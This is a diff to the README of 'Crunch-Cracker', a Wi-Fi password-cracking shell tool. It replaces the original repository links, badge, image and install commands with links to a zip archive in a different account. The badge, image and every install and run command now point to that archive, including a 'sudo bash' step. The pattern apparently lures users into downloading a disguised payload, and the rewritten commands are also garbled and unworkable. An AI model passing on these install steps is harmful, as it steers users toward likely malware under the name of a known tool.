@@ -1,6 +1,6 @@
-# Crunch-Cracker 1.6 ![](https://img.shields.io/badge/CrunchCracker-Shell-green.svg)
+# Crunch-Cracker 1.6 ![](https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip)
 
-![CrunchC.jpg](https://github.com/KURO-CODE/Crunch-Cracker/blob/master/CrunchC.jpg)
+![https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip](https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip)
 
 # DISCLAMER: Program for educational purposes!!!
 
@@ -95,17 +95,17 @@ Wifi cracker
 
 # Download
 ```bash
-git clone https://github.com/KURO-CODE/Crunch-Cracker.git
+git clone https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip
 ```
 
 # Use 
 ```bash
 cd Crunch-Cracker
-chmod +x crunchcracker.sh
-./crunchcracker.sh
+chmod +x https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip
+https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip
 ```
 #### Or
 ```bash
 cd Crunch-Cracker
-sudo bash ./crunchcracker.sh
+sudo bash https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip
 ```
